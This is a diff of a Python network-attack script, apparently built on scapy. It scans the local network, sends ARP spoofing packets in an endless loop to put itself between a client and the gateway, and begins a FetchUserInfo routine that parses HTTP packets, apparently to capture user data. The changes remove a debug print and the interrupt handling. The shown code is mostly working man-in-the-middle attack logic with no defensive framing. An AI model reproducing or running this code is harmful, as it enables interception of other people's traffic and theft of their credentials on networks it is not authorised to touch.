@@ -41,7 +41,6 @@ def ScanDevices():
 	for element in result:
 		client = {'ip': element[1].psrc, 'mac': element[1].hwsrc}
 		if element[1].psrc != gateway_addr:
-			# print(element[1].psrc + '\t\t' + element[1].hwsrc)
 			client_list.append(client)
 		else:
 			AP_info = client
@@ -61,13 +60,10 @@ def SpoofARP(target_ip, target_mac, spoof_ip):
 	send(pkt, verbose = False)
 
 def SendSpoofARP(client_list, AP_info):
-	try:
-		while True:
-			SpoofARP(AP_info['ip'], AP_info['mac'], client_list[0]['ip'])
-			SpoofARP(client_list[0]['ip'], client_list[0]['mac'], AP_info['ip'])
-			time.sleep(2)
-	except KeyboardInterrupt:
-		return
+	while True:
+		SpoofARP(AP_info['ip'], AP_info['mac'], client_list[0]['ip'])
+		SpoofARP(client_list[0]['ip'], client_list[0]['mac'], AP_info['ip'])
+		time.sleep(2)
 
 def FetchUserInfo(packet):
 	http_packet=str(packet)
